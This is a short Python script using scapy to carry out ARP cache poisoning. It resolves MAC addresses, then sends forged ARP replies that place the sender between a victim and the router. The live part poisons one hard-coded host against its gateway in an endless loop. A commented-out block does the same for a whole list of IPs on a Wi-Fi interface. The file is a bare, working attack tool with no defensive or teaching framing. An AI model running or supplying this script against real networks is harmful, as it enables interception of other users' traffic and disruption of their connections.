from scapy.all import *
import time

def get_mac(ip, interface):

    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)

    try:
        result, unanswered = srp(arp_request, timeout=3, iface=interface, verbose=False)
        return result[0][1].src
    except Exception as e:
        print(f"Error getting MAC address for {ip} on interface {interface}")
        print(e)
        return None


def trick(victim_ip, victim_mac, router_ip, router_mac):
    send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac))
    send(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac))

"""
UP = """"""

IPs = UP.split("\n")

routerip = "10.50.16.1"
interface_name = "Wi-Fi 2"  
for ip in IPs:
    l = ip.split(" ")[1].replace(",", "")
    print(l)
    mymac = get_mac(l, interface_name)
    router_mac = get_mac(routerip, interface_name)

    trick(l, mymac, routerip, router_mac)
    time.sleep(.1)
""" 


ip = "10.50.31.84"
mymac = get_mac(ip,  "Wi-Fi 2"  )
router_mac = get_mac( "10.50.30.1",  "Wi-Fi 2"  )


while True:
    trick(ip, mymac, "10.50.30.1", router_mac)
    time.sleep(1)




